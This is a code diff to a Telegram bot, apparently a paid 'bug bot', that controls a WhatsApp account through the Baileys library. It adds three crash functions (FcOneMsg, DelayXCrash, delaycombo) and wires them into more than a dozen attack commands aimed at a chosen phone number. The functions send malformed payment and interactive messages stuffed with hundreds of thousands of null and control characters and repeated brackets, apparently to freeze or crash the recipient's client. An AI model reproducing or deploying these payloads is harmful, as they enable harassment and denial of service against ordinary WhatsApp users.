@@ -61,7 +61,7 @@ const {
   BufferJSON,
   DisconnectReason,
   proto,
-} = require("@bellachu/baileys");
+} = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const crypto = require('crypto');
 const chalk = require('chalk');
@@ -4660,6 +4660,10 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -4764,6 +4768,10 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -4854,6 +4862,10 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -4958,6 +4970,10 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5063,6 +5079,10 @@ bot.command("combox", checkWhatsAppConnection, checkCooldown, async (ctx) => {
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5124,6 +5144,10 @@ bot.command("/specterdelay", checkWhatsAppConnection, checkPremium, checkCooldow
     await TvZFreeze(sock, target);
     await DelayHardTod(sock, target, ptcp = true);
     await sleep(2000);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5225,6 +5249,10 @@ bot.command("drainkouta", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5286,6 +5314,10 @@ bot.command("StupidLow", checkWhatsAppConnection, checkPremium, checkCooldown, a
     await TvZFreeze(sock, target);
     await DelayHardTod(sock, target, ptcp = true);
     await sleep(2000);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5326,7 +5358,7 @@ bot.command("flowrdelay", checkWhatsAppConnection, checkPremium, checkCooldown, 
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 30; i++) {
+  for (let i = 0; i < 1; i++) {
     await nexanewdelay(sock, target);
     await sleep(1000);
     await Dileyy(sock, target);
@@ -5347,6 +5379,10 @@ bot.command("flowrdelay", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await TvZFreeze(sock, target);
     await DelayHardTod(sock, target, ptcp = true);
     await sleep(2000);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5449,6 +5485,10 @@ bot.command("KillerBlnk", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5549,6 +5589,10 @@ bot.command("VisiSat", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5649,6 +5693,10 @@ bot.command("FlowSat", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await VTXCrashSw(sock, target);
     await VampDelayAudio(target);
     await sleep(1009);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5709,6 +5757,10 @@ bot.command("SatHard", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await TvZFreeze(sock, target);
     await DelayHardTod(sock, target, ptcp = true);
     await sleep(2000);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5829,6 +5881,10 @@ bot.command("MediumLay", checkWhatsAppConnection, checkPremium, checkCooldown, a
     await TvZFreeze(sock, target);
     await DelayHardTod(sock, target, ptcp = true);
     await sleep(2000);
+    await delaycombo(sock, target);
+    await DelayXCrash(sock, target);
+    await FcOneMsg(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -6805,6 +6861,89 @@ bot.catch((err) => {
   console.error('Bot error:', err);
 });
 // FUNCTION BUG
+async function FcOneMsg(sock, target) {
+  let msg = {
+    requestPaymentMessage: {
+      currencyCodeIso4217: "USD",
+      requestFrom: target,
+      expiryTimestamp: null,
+      contextInfo: {
+        remoteJid: "O",
+        isForwarded: true,
+        forwardingScore: 9999,
+        externalAdReply: {
+          title: "\0",
+          body: "\0",
+          mediaType: "VIDEO",
+          renderLargerThumbnail: true,
+          previewType: "VIDEO",
+          sourceUrl: "https://nanzlyora",
+          mediaUrl: "https://nanzlyora",
+          showAdAttribution: true
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, msg, {
+    messageId: null,
+    participant: { jid: target }
+  });
+}
+
+async function DelayXCrash(sock, target) {
+    try {
+        const msg = {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "𝐗𝐚𝐤𝐚‌ 𝐓𝟓"
+                        },
+                        nativeFlowMessage: {
+                            buttons: "\u001A".repeat(500000)
+                        }
+                    }
+                }
+            }
+        };
+
+        await sock.relayMessage(target, msg, {});
+        console.log("success send");
+    } catch (err) {
+        console.error("Error:", err);
+    }
+}
+
+async function delaycombo(sock, target) {
+  let ajengbikinaceng = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "\n0000\nP\n"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "[".repeat(35000),
+            buttons: [
+              {
+                name: "\u0000".repeat(250000) + "\x10".repeat(250000),
+                buttonParamsJson: "{}"
+              }
+            ]
+          },
+          participant: {
+            Jid: target
+          }
+        }
+      }
+    }
+  };
+  await sock.relayMessage(target, ajengbikinaceng, {
+    participant: { jid: target }
+  });
+}
+
 async function VampDelayAudio(target) {
   try {
     const mentionedList = [
